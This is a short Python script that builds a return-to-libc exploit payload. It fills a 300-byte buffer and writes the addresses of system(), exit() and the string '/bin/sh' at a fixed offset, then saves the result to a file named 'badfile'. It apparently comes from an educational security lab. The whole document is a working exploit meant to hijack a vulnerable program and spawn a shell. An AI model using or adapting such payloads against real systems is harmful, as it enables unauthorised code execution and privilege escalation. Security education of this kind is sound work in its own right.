#!/usr/bin/python3
import sys

content = bytearray(0xaa for i in range(300))

sh_addr = 0xffffd2b7  # The address of "/bin/sh". This value may change!
system_addr = 0xf7db7030  # The address of system()
exit_addr = 0xf7da98e0  # The address of exit()


X = 28
content[X:X+4] = (system_addr).to_bytes(4, byteorder='little')
content[X+4:X+8] = (exit_addr).to_bytes(4, byteorder='little')
content[X+8:X+12] = (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)

print("[+] Exploit successfully printed to \"badfile\".")